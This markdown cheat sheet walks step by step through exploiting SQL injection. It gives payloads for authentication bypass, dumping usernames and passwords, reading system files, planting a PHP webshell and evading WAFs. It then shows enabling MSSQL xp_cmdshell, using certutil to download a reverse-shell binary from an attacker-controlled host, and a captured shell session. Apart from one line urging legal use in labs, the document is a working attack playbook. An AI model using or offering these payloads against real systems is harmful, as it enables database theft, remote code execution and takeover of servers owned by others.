# SQL Injection Exploitation Cheat Sheet

## 🛠️ Step-by-Step Manual SQL Injection Exploitation

---

## 1️⃣ Identify SQL Injection Vulnerability

### **Basic Testing Payloads**
Try these in input fields (username, search, etc.) or URL parameters:

```sql
' OR 1=1 --  
" OR 1=1 --  
' OR 'a'='a' --  
" OR "a"="a" --  
' OR 1=1#  
```

### **Boolean-based SQLi (True/False Response)**
```sql
' AND 1=1 --  -- ✅ should return normal page
' AND 1=0 --  -- ❌ should return error or different response
```

### **Error-Based SQLi (Extract Information)**
```sql
' AND (SELECT 1/0) --   -- Division by zero error
' UNION SELECT 1, @@version --  -- Retrieves database version
```

### **Time-Based SQLi (Blind SQLi)**
If no visible errors, use time delays:
```sql
' OR IF(1=1, SLEEP(5), 0) --   -- MySQL
' OR pg_sleep(5) --            -- PostgreSQL
' OR WAITFOR DELAY '00:00:05' --  -- MSSQL
```

---

## 2️⃣ Determine Database Type

Use these queries to detect the DBMS:

```sql
SELECT @@version;           -- MySQL, MSSQL
SELECT version();           -- PostgreSQL
SELECT banner FROM v$version; -- Oracle
SELECT database();          -- MySQL
SELECT db_name();           -- MSSQL
```

---

## 3️⃣ Find Number of Columns

Use `ORDER BY` or `UNION SELECT`:

```sql
' ORDER BY 1 --  
' ORDER BY 2 --  
' ORDER BY 3 --  -- Keep increasing until error
```

Alternatively, use `UNION SELECT`:

```sql
' UNION SELECT NULL --  
' UNION SELECT NULL, NULL --  
' UNION SELECT NULL, NULL, NULL --  -- Keep increasing NULLs
```

Once found, use it for data extraction.

---

## 4️⃣ Extract Database Information

### **Find Database Name**
```sql
' UNION SELECT 1, database() --  -- MySQL
' UNION SELECT 1, db_name() --   -- MSSQL
' UNION SELECT 1, current_database() --  -- PostgreSQL
```

### **Find Table Names**
```sql
' UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema=database() --  
```

### **Find Column Names**
```sql
' UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='users' --  
```

---

## 5️⃣ Dump Sensitive Data

```sql
' UNION SELECT 1, username, password FROM users --  
```

If passwords are hashed, try cracking them with `hashcat` or `john`.

---

## 6️⃣ Bypass Authentication

```sql
' OR '1'='1' --  
admin' --  
admin' #  
admin' OR '1'='1' --  
```

---

## 7️⃣ Upload a Webshell (MySQL)

```sql
' UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php' --  
```

Access via `http://target.com/shell.php?cmd=whoami`

---

## 8️⃣ Privilege Escalation via SQLi

### **Check User Privileges**
```sql
' UNION SELECT user, host FROM mysql.user --  
' UNION SELECT 1, user(), 2 --  
' UNION SELECT 1, current_user(), 2 --  
```

### **Enable File Read/Write**
```sql
' UNION SELECT LOAD_FILE('/etc/passwd') --  
' UNION SELECT "<?php system($_GET['cmd']); ?>" INTO DUMPFILE '/var/www/html/shell.php' --  
```

---

## 9️⃣ Evading WAFs & Filters

### **Bypass Quotes**
```sql
admin' --  -- ✅ Works normally
admin'/**/--  -- ✅ Comments help bypass filters
```

### **Bypass Keyword Filters**
```sql
UNION/**/SELECT/**/1,2,3 --  
'UNION'+'SELECT'+1,2,3 --  
```

### **Hex Encoding (MySQL)**
```sql
' UNION SELECT 1, 0x61646d696e, 0x70617373776f7264 --  -- Hex for 'admin', 'password'
```
### **Additional**
Finding all databases
```
' UNION SELECT 1, schema_name FROM information_schema.schemata --  
```
---

## 🔚 Final Notes

- Automate with `sqlmap` if allowed:
  ```sh
  sqlmap -u "http://target.com/index.php?id=1" --dbs
  ```
- Be ethical! Use only in **legal** environments (e.g., CTF, labs, bug bounties).
- Consider WAF bypass techniques if needed.

### `xp_cmdshell` in Microsoft SQL Server
If underlying OS is windows and software is MS SQL Server `xp_cmdshell` can be enabled if u have the privileges.

This attack is **likely to succeed** if:
- The SQL Server **runs as an administrator or SYSTEM**.
- The `**xp_cmdshell**` **feature is enabled** or can be enabled.
- The attacker has **sysadmin privileges** in MSSQL.
- **Windows Authentication is enabled**, allowing Impacket usage.

## Enabling `xp_cmdshell` on MSSQL

By default, `xp_cmdshell` is **disabled** in MSSQL. We need to enable it first.

We will use **Impacket** to authenticate and enable `xp_cmdshell`.

### **Step 1: Connect to MSSQL Using Impacket**

```
kali@kali:~$ impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
...
```

### **Step 2: Enable** `**xp_cmdshell**`

```
SQL> EXECUTE sp_configure 'show advanced options', 1;
[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.

SQL> RECONFIGURE;

SQL> EXECUTE sp_configure 'xp_cmdshell', 1;
[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.

SQL> RECONFIGURE;
```

> **Listing 1 - Enabling** `**xp_cmdshell**` **feature**

### **Step 3: Verify** `**xp_cmdshell**` **Execution Capability**

```
SQL> EXECUTE xp_cmdshell 'echo xp_cmdshell is enabled';
```

If the output contains "`xp_cmdshell` is enabled," then the feature is working.

## **Executing System Commands via** `**xp_cmdshell**`

Once enabled, we can execute system commands using `EXECUTE xp_cmdshell`.

```
SQL> EXECUTE xp_cmdshell 'whoami';

output
---------------------------------------------------------------------------------
nt service\mssql$sqlexpress

NULL
```

> **Listing 2 - Executing Commands via xp_cmdshell**

But lets say we do not have access to the SQL server directly lets change the way we are enabling it.

Lets say in an application the following payload is working 
```
admin'; IF ((select COUNT(*) as count from users where username = 'butch')=2) WAITFOR DELAY '0:0:5'--
```

Checking if we can enable system commands.

```
admin'; IF (SELECT value_in_use FROM sys.configurations WHERE name = 'xp_cmdshell') = 1 WAITFOR DELAY '0:0:5'--
```
If the payload take 5 seconds of time to complete execution it means we can proceed.
Checking if we have system privileges in SQL serverr
```
admin'; IF (IS_SRVROLEMEMBER('sysadmin') = 1) WAITFOR DELAY '0:0:5'--
```
If the above payload takes 5 seconds u have system privilege.
If you have **sysadmin privileges**, enable `xp_cmdshell` via SQL injection:
```
admin'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
```
Verify
```
admin'; IF (SELECT value_in_use FROM sys.configurations WHERE name = 'xp_cmdshell') = 1 WAITFOR DELAY '0:0:5'--
```

Exploitation
1. Making temp directory
```
admin'; EXEC xp_cmdshell 'mkdir C:\Temp';--
```


2. Downloading reverse shell

```
admin'; EXEC xp_cmdshell 'certutil.exe -urlcache -f http://192.168.45.182:8000/reverse.exe C:\Temp\reverse.exe';--
```
3. Executing binary
```
admin'; EXEC xp_cmdshell 'C:\Temp\reverse.exe';--
```
	The shell
```
┌──(aryan㉿AryanUbuntu)-[~]
└─$ nc -nvlp 3333
Listening on 0.0.0.0 3333
Connection received on 192.168.175.50 56289
Microsoft Windows [Version 10.0.20348.740]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt service\mssql$sqlexpress
```



---
